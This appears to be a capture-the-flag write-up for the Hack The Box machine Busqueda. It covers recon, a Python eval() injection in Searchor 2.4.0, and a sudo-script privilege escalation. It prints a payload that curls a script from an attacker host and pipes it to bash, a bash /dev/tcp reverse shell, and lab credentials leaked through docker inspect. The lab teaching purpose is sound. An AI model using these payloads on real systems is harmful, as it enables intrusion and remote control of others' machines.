---
title: HTB Busqueda
author: hanhctf
date: 2023-04-10 22:22:22 +0700
categories: [Write-up, HTB]
tags: [eval(), python, code review]
toc: true
mermaid: true
---

# [**Busqueda**](https://www.hackthebox.com/achievement/machine/108910/537)

## NMAP

`sudo nmap -sC -sV -Pn 10.129.48.104 -oN nmap`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## FOOTHOLD

First of all, add searcher.htb to /etc/hosts  

After analyze website, found a link to github repo Searchor 2.4.0

Found a vuln of searchor follow this link <https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303>

Found in this article <https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html> payload  

`eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))`
![](/commons/HTB/Busqueda/1.ACE_vuln.png)

==> payload to get reverse shell
`'+eval(compile('for x in range(1):\n import os\n os.system("curl http://<attacker_IP>/rev.sh|bash")','a','single'))+'`  
![](/commons/HTB/Busqueda/2.got_rev_shell_burp.png)

**Got user.txt flag**

## Privilege Escalation  

After research, we found ssh cred of svc **jh1usoih2bkjaspwe92**
~[](/commons/HTB/Busqueda/3.ssh_cred_svc.png)

```shell
vc@busqueda:/opt/scripts$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
    
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

1. Run `sudo -l`   ⇒ see `/opt/scripts/system-checkup.py` with 3 option
2. ***Option1***: `docker-ps`   ⇒ 2 dockers are **gitea** and **mysql_db**

```shell
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS        PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 11 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 11 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

3. ***Option2***: docker-inspect  ⇒  cred log in gitea.searcher.htb administrator:**yuiu1hoiu4i5ho1uh**

```shell
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db
--format={"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
```

4. Login as administrator ⇒ analyze code ⇒ code that can exploit.
![](/commons/HTB/Busqueda/5.vuln_code.png)

5. We move to `/tmp` dir ⇒ create an execution  file  `full-checkup.sh`

```shell
#!/bin/bash

bash -i &> /dev/tcp/<attackerIP>/port 0>&1
```

6. Run `listener` on other attacker terminal and run

```shell
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```  
